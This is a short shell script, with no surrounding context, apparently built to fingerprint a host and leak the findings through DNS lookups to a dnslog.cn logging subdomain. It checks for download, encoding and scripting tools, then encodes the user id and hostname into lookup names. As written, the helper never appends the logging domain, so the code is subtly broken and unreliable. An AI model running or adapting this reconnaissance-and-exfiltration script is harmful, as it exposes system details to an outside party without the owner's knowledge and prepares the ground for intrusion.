Z=lt46i7.dnslog.cn
q(){ getent hosts "$1" >/dev/null 2>&1; }
q probe.start
for t in base32 od xxd base64 wget curl node python3 python perl nslookup host dig busybox bash sh; do command -v $t >/dev/null 2>&1 && q tool.$t; done
q id.$(id -u)
q hn.$(hostname | tr -cd 'a-z0-9' | cut -c1-12)
q probe.end